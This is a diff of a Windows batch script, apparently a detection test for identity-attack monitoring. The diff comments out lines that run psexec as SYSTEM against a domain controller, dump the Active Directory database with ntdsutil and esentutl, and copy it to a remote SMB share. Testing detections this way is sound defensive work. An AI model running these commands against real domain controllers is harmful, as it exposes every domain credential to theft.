@@ -108,12 +108,12 @@ TIMEOUT /T 120
 
 rem **Remote code execution attempts and Data exfiltration over SMB 
 rem **(PUT THE NAME OF A LOCAL DIRECTORY TO COPY FILES TO)
-psexec.exe -accepteula -s \\%mydc%  cmd.exe
-ntdsutil.exe "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
-copy "c:\windows\mdi\Active Directory" \\aftest2\test
-exit
-#esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
-TIMEOUT /T 120
+rem psexec.exe -accepteula -s \\%mydc%  cmd.exe
+rem ntdsutil.exe "Activate Instance NTDS" "IFM" "Create Full c:\windows\mdi" "q" "q"
+rem copy "c:\windows\mdi\Active Directory" \\aftest2\test
+rem exit
+rem #esentutl /y /i c:\windows\ntds\ntds.dit /d c:\windows\ntds.dit
+rem TIMEOUT /T 120
 
 
 rem ** Cleanup
